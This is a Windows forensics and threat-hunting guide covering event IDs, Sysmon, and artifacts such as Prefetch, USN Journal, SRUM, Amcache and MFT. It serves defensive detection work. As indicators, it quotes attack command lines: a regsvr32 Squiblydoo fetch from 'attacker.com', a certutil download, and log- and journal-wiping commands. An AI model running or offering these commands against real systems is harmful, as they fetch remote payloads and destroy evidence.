Module 0: Prerequisites & ETW Architecture

All Windows logging flows through Event Tracing for Windows (ETW). The kernel emits structured events through ETW providers; Event Viewer is just a consumer. Without enabling the right audit policies and installing Sysmon, you see less than 30% of what actually happens.

Enable These via gpedit.msc Before Hunting

  • Audit Process Creation (Success + Failure): Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Detailed Tracking > Audit Process Creation
  • Include Command Line in 4688: Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events — Without this, 4688 only tells you what ran, not how.
  • PowerShell Script Block Logging: Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on Script Block Logging
  • Audit Logon Events, Object Access, Privilege Use: Enable all under Advanced Audit Policy Configuration.
  • Install Sysmon: Download from Sysinternals, use a SwiftOnSecurity config: sysmon.exe -accepteula -i sysmonconfig.xml
All timestamps in Event Viewer are UTC. Always correlate with the system timezone offset when presenting evidence to users in local time.

Module 2: Service Start / Stop

Event ID 7045Event ID 4697Event ID 7036Event ID 7040 Windows Logs > System (7036, 7040, 7045) | Security (4697)
Event IDMeaningHunt Focus
7045 / 4697New service installedImagePath outside System32\drivers, Service Type = kernel mode driver, random names like xKrnl64.sys.
7036Service entered Running/Stopped stateSequence: DiagTrack or WinDefend stopped then unknown service started = anti-forensics stack pivot.
7040Service start type changedDefender service changed from Automatic → Disabled = tampering attempt.

BYOVD (Bring Your Own Vulnerable Driver) Kill Chain

  • Attacker drops a known-vulnerable but legitimately signed .sys driver (e.g., old RTCore64.sys, gdrv.sys) → generates 7045 or 4697.
  • They exploit the driver's IOCTL to disable kernel callbacks (PPL, PatchGuard bypass) → enables kernel write.
  • They map unsigned malicious shellcode into kernel space using the now-vulnerable driver → no further log entry.
  • They stop the vulnerable driver service (generates 7036 Stopped) to clean up.
Red Flags: Service ImagePath in %TEMP%, C:\Users\Public\, or any AppData subfolder. Legitimate kernel drivers live in C:\Windows\System32\drivers\.

Detecting Security Tool Termination

Hunt for 7036 events where ServiceName matches: WinDefend, MsMpSvc, SysmonDrv, DiagTrack, EventLog, SecurityHealthService. Any of these stopping unexpectedly without a planned maintenance window is a critical indicator.

Module 3: Anti-Forensics & Log Clearing

Event ID 1102Event ID 104 Windows Logs > Security (1102) | System (104)

1102 = Security log cleared by a user account. 104 = System log cleared. Both are atomic evidence of compromise or insider threat.

Why It's Critical: Normal enterprise environments almost never manually clear these logs. A single 1102 event is probable cause for a full incident response. Look at Subject: Account Name — the account that cleared it is either compromised or malicious.

What to Do After Seeing 1102

  • Note the timestamp and the clearing account.
  • Pivot to Sysmon or EDR: look for wevtutil cl Security, wevtutil cl System, or Clear-EventLog PowerShell in a 4688/Sysmon 1 record immediately before.
  • Check USN Journal for file deletions in C:\Windows\System32\winevt\Logs\ around the same timestamp.
  • Check Shadow Copies (vssadmin list shadows) for pre-wipe snapshots.

USN Journal Deletion via Process Creation

Event ID 4688

Filter 4688 and search Process Command Line for: fsutil usn deletejournal /D C:. This destroys the NTFS change log, preventing you from knowing what files were created, modified, or deleted.

Module 4: Timestomping & Time Manipulation

Event ID 4616 Windows Logs > Security

Attackers manipulate the system clock to exploit leaked code-signing certificates that have since been revoked. By rolling back time to when the cert was valid, they can load unsigned kernel drivers without triggering Driver Signature Enforcement (DSE).

Filter Rule: Exclude SubjectLogonId with value LOCAL SERVICE (that is normal NTP sync). Any user account or unknown process initiating a time change is a red flag.

Correlating Timestomping with BYOVD

  • Spot 4616 showing clock rolled back 2–5 years.
  • Within minutes, look for 7045 (new driver installed) — the signed-but-expired driver loads successfully.
  • Then clock resets forward — another 4616 — to avoid detection.

File Timestomping (MFT vs STANDARD_INFORMATION)

Attackers use tools like timestomp.exe to modify $STANDARD_INFORMATION timestamps in the MFT. However, $FILE_NAME timestamps cannot be changed from user-mode — a discrepancy between the two is definitive proof of tampering. See the MFT tab for deep analysis.

Identifying Malicious USB Devices

  • Extract the Instance ID from the log — it contains VID_xxxx&PID_xxxx.
  • Cross-reference at USB ID Database — if VID maps to a keyboard controller but the device was presented as a Flash Drive, it's a BadUSB / Rubber Ducky.
  • Correlate plug time with 4688 events immediately after — HID injection payloads execute within 1–2 seconds of plug-in.
Key Indicator: A "USB Flash Drive" appearing as a HID keyboard device that spawns cmd.exe or powershell.exe within 2 seconds of plug-in = guaranteed BadUSB attack.

Module 6: DMA / PCIe Hardware Attacks

Event ID 4122 / 4123 Apps & Services > Microsoft > Windows > BitLocker-API > Management

Direct Memory Access (DMA) attacks use a PCIe device (Screamer card, Thunderbolt device, custom FPGA) that physically reads and writes system RAM without CPU involvement — completely bypassing all OS-level security controls.

EventMeaning
4122A DMA-capable device was connected to a PCIe/Thunderbolt port and the IOMMU (Kernel DMA Protection) was not active — memory is exposed.
4123DMA-capable device connected but IOMMU is active — protected, but still note the device.
DMA Cheat Kit Detection: Custom PCIe DMA cards (used for game cheating and espionage) spoof legitimate device IDs. If you see 4122 triggered by a device claiming to be "Intel Wi-Fi 6 AX200" but it was just physically inserted into a PCIe slot mid-session with no reboot, it is a DMA card reading RAM.

Additional DMA Artifact Correlation

  • Check Kernel-PnP logs (Event 400/410) for the PCIe device's hardware ID and plug/unplug timestamps.
  • Check Sysmon ID 6 (Driver Load) for any new driver that loaded around the same time.
  • Check System event 7045 for a new service registered to manage the DMA card's firmware communication component.

Checking IOMMU / Kernel DMA Protection Status

msinfo32.exe → System Summary → Look for Kernel DMA Protection: ON

Sysmon ID 8 — CreateRemoteThread

The final injection stage. After allocating memory (ID 10 with VM_WRITE) the attacker calls CreateRemoteThread to execute the injected payload inside the victim process.

Hunt Rule: SourceImage = any suspicious process → TargetImage = explorer.exe, notepad.exe, winlogon.exe, or a game client. Any legitimate app creating remote threads into another app is an injection attempt.

Detecting Exclusion Abuse (Event 5004 / 5007)

Open Event ID 5004 or 5007 and look at the New value field. If an exclusion path like C:\Users\Username\AppData\Roaming\cheat\ or C:\ProgramData\gamehack\ appears, the attacker added their payload folder to bypass real-time scanning.

Critical Chain: 5001 (RTP disabled) → 1006 (malware detected but RTP was off, detected by manual scan later) → 1008 (action failed) = active, running malware evading Defender.

PowerShell — Query Defender Logs

Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" | Where-Object {$_.Id -in @(1006,1116,5001,5004,5007,3002)} | Select-Object TimeCreated,Id,Message | Format-List

USN Journal Overview

The Update Sequence Number (USN) Journal ($UsnJrnl:$J) is an NTFS metadata structure that records every file-system change on a volume — file creation, deletion, rename, attribute changes — with a 64-bit monotonically increasing sequence number and a UTC timestamp.

All USN Journal timestamps are UTC. The TimeStamp field in each record represents the exact UTC time the file-system event occurred at the kernel level.

Tools

JournalTrace (GUI) MFTECmd.exe (Eric Zimmerman) TimelineExplorer (CSV Viewer)

Extraction Commands

Run elevated (Administrator). Replace C: with any NTFS drive letter:

MFTECmd.exe -f "C:\$Extend\$UsnJrnl:$J" --csv . --csvf FullJournal.csv

For other drives (D:, E:, etc.):

MFTECmd.exe -f "D:\$Extend\$UsnJrnl:$J" --csv . --csvf FullJournal_D.csv

Open the resulting CSV in TimelineExplorer for sorting, filtering, and highlighting.

Each record has a bitmask Reason field. Multiple reasons can be OR'd together in a single record. The final record for any file change will always include CLOSE.

USN Journal Forensic Hunt Scenarios

Scenario 1: Finding a Dropped Payload

Filter CSV for Reason containing FILE_CREATE + CLOSE. Sort by timestamp. Look for .exe, .dll, .sys, .ps1, .vbs, .bat in:

  • C:\Users\*\AppData\Local\Temp\
  • C:\ProgramData\
  • C:\Users\Public\
  • C:\Windows\Temp\
  • Drive root: C:\*.exe

Scenario 2: Timestomping Detection

Filter for BASIC_INFO_CHANGE without a preceding DATA_OVERWRITE or DATA_EXTEND. The file's content did not change but its metadata did — this is pure timestamp manipulation. Cross-reference with MFT $STANDARD_INFORMATION vs $FILE_NAME attribute timestamps.

Scenario 3: Anti-Forensic Cleanup

Filter for FILE_DELETE in C:\Windows\System32\winevt\Logs\, C:\Windows\Prefetch\, or C:\Windows\AppCompat\. Deletion of these artifacts is direct evidence of evidence destruction.

Prefetch Overview

Windows Prefetch (C:\Windows\Prefetch\*.pf) records evidence of execution. Each .pf file stores the executable name, a hash of its path, up to 8 last-run timestamps (Win10+), run count, and all files/directories loaded during the first 10 seconds of execution. This means even if the executable is deleted, its Prefetch entry proves it ran.

Prefetch timestamps are stored in UTC (Windows FILETIME format, 100-nanosecond intervals since January 1, 1601). Tools like WinPrefetchView display them in local time — always note the UTC offset when documenting evidence.

Tools

WinPrefetchView (NirSoft) TimelineExplorer

What to Look For

  • The last 8 run timestamps — shows frequency of execution and when cheats/malware were last active.
  • Run count — a tool run once vs 200 times tells a very different story.
  • Files and directories referenced — reveals what the executable accessed, including config files, DLLs it loaded, and target directories.
  • Volume serial number — identifies which drive the executable ran from (useful for USB execution).

Critical Prefetch Entries — Deep Analysis

CONHOST.EXE — Console Host

Normal: conhost.exe always runs as a child of a console application — it hosts the console window. It is spawned automatically by cmd.exe, powershell.exe, etc.

SUS: If Prefetch shows CONHOST.EXE was run at odd hours (3AM, during logoff) or ran far more frequently than normal user activity would explain, a background console application (cheat launcher, C2 implant script) was running hidden.

Check the files loaded inside the Prefetch entry — if conhost references DLLs from AppData\Temp or loads unusual .dll files, those are the injected modules.

CONSENT.EXE — UAC Elevation Dialog

Normal: consent.exe runs once per UAC prompt. It appears when an application requests elevation.

SUS: If Prefetch shows CONSENT.EXE ran many times in a short window, or at times when the user was not at the machine, something was repeatedly requesting admin elevation — automated malware or a cheat loader bypassing UAC repeatedly.

Correlate timestamps with 4688 (process creation) events to see what requested elevation each time.

CURL.EXE — Command-Line Downloader

Normal use: Developers use curl for API testing. It is not a standard user tool.

SUS: CURL.EXE in Prefetch means someone downloaded a file from the internet via the command line. Check the files referenced section for any downloaded output files. Correlate with Sysmon ID 3 (network connections) at the same timestamp to recover the URL and destination IP.

Cheat loaders frequently use curl or PowerShell Invoke-WebRequest to stage second-phase payloads from a C2 server.

RUNDLL32.EXE — DLL Execution Host

Normal: Legitimate use includes Control Panel applets, screensavers, and Windows setup routines.

SUS Patterns:
  • Rundll32 running from C:\Users\*\AppData\ instead of System32.
  • Referencing a DLL with a random name (xkl39a.dll).
  • Referenced files include network connections (Sysmon ID 3) — rundll32 should not make outbound connections.
  • High run count with referenced files in TEMP — shellcode loader pattern.

Check the DLL path in the referenced files. Submit the hash to VirusTotal. Look up the DLL in Amcache for first-seen timestamp.

REGSVR32.EXE — COM DLL Registration

Normal: Used to register COM/OLE DLL components. Usually runs once during software install.

Squiblydoo / AppLocker Bypass: regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll — fetches and executes a COM scriptlet from the internet. Bypasses AppLocker and Software Restriction Policies entirely. Prefetch will show REGSVR32.EXE with SCROBJ.DLL in the referenced files list.

MSHTA.EXE — HTML Application Host

Executes .hta files (HTML Applications). These are full-trust HTML/JS/VBScript apps.

SUS: Prefetch shows MSHTA.EXE running in environments where HTA files are not used. Often spawned by Office macros or phishing emails. Referenced files may include .hta files from Temp or AppData.

WSCRIPT.EXE / CSCRIPT.EXE — Script Host

Windows Script Host for .vbs and .js files.

SUS: Referenced files in WSCRIPT.EXE Prefetch pointing to .vbs or .js scripts in AppData, ProgramData, or attached to Office temp files = macro-delivered script payload.

POWERSHELL.EXE / POWERSHELL_ISE.EXE

PowerShell execution leaves Prefetch evidence even for -NonInteractive -WindowStyle Hidden runs.

SUS: High run count at off-hours. Referenced files showing System.Management.Automation.dll loaded from an unusual path = modified/custom PowerShell host for evasion.

CERTUTIL.EXE — Certificate Utility (LOLBin)

Built-in Windows tool. Legitimate use: manage certificates.

SUS: Attackers use certutil -decode to decode base64-encoded payloads, or certutil -urlcache -split -f http://... payload.exe to download files while bypassing proxy restrictions. If Prefetch shows certutil with Temp files in the referenced list, a payload was decoded or downloaded.

BITSADMIN.EXE — Background Transfer

SUS: Used to download files in background transfers, often to persist a downloader that survives reboots. Prefetch will show it ran; correlate with BITS job logs in Microsoft-Windows-Bits-Client/Operational.

SCHTASKS.EXE / AT.EXE — Task Schedulers

SUS: Prefetch for SCHTASKS.EXE + referenced parameter files from Temp or AppData = persistence being installed. Correlate timestamp with Event ID 4698 (scheduled task created).

NET.EXE / NET1.EXE — Network Commands

SUS: Used for user management (net user /add), share enumeration (net share), and lateral movement. Prefetch proves execution even if command history was cleared.

MIMIKATZ.EXE / Renamed Variants

Credential harvesting tool. Often renamed to avoid signature detection.

SUS: Even if renamed to svchost.exe or explorer.exe, the Prefetch hash is based on the original executable path. If the filename in Prefetch doesn't match the parent folder (e.g., SVCHOST.EXE-ABC12345.pf but launched from C:\Users\Name\Desktop\ instead of System32), it's a renamed tool.

SRUM Analysis (System Resource Usage Monitor)

The System Resource Usage Monitor (SRUM) is a power-forensic artifact located at C:\Windows\System32\sru\SRUDB.dat. It records application resource usage over 30-60 days, including CPU cycles, data sent/received (Bytes Sent/Received), and energy usage. Even if an executable is deleted and its Prefetch is wiped, SRUM often maintains the record of its historical network and CPU impact.

Key Tools

SrumECmd (Eric Zimmerman)

Extraction Command

SrumECmd.exe -f "C:\Windows\System32\sru\SRUDB.dat" --csv .

Forensic Significance

FieldForensic Value
AppIdThe name of the executable. Great for finding renamed malware that had high network usage.
UserIdThe user account that ran the app.
Bytes Sent / ReceivedCritical for identifying data exfiltration. If notepad.exe sent 500MB of data, it was not being used for notes.
Network InterfaceShows if the data was sent via Wi-Fi, Ethernet, or a VPN/Virtual adapter.
Cycle TimeCPU impact. High cycles for a "background" app suggests crypto-mining or heavy encryption activity.
Note: SRUM records are typically written to the database every 60 minutes. Very recent activity might not be in the SRUDB.dat until the next flush.

Amcache Analysis

Amcache.hve is a registry hive located at C:\Windows\AppCompat\Programs\Amcache.hve. It is a gold mine for tracking the first time an executable was seen on the system, its cryptographic hash (SHA1), and its full path.

Key Tools

AmcacheParser (Eric Zimmerman)

Extraction Command

AmcacheParser.exe -f "C:\Windows\AppCompat\Programs\Amcache.hve" --csv .

Visualizing Evidence

  • SHA1 Hashes: Amcache records the SHA1 of almost every executable run. Perfect for VirusTotal lookups of deleted files.
  • File Path: Proves where the file was executed from (e.g., a hidden folder in System32).
  • First Run Timestamp: The FileCreationTime in Amcache often correlates to the moment the malware was first deployed.
  • Original Filename: Even if the attacker renamed mimikatz.exe to calc.exe, the internal metadata in Amcache may reveal the truth.

MFT (Master File Table)

The Master File Table (MFT) is the "index" of an NTFS volume. Every file and directory has at least one entry in the MFT. It contains timestamps, file size, and location on the physical disk.

Key Tools

MFTECmd (Eric Zimmerman)

Extraction Command

MFTECmd.exe -f "C:\$MFT" --csv . --csvf MFT.csv

Indepth Analysis

By parsing the MFT, you can find deleted files (if their MFT record has not been overwritten yet). You are looking for the four primary timestamps: Modified, Accessed, Created, and MFT Entry Modified (MACE).

Timestomping Detection: Compare $STANDARD_INFORMATION (SI) timestamps with $FILE_NAME (FN) timestamps. SI can be changed by user-mode tools; FN is harder to change. A mismatch is a "Time Warp" and proves the file was timestomped.

AppCompatCache (Shimcache)

The AppCompatCache (also known as Shimcache) is used by Windows to track application compatibility issues. For forensic analysts, it provides a history of executables that were present on the file system and were at some point executed. It is stored in the SYSTEM registry hive.

Key Tools

AppCompatCacheParser (Eric Zimmerman)

Extraction Command

AppCompatCacheParser.exe --csv .

Forensic Significance

  • Execution Proof: If a file is in the Shimcache, it was likely executed (or at least browsed/interacted with in a way that triggered the compatibility engine).
  • Path and Name: Shows where the file was located.
  • Last Modified: Includes the standard file system Last Modified time.
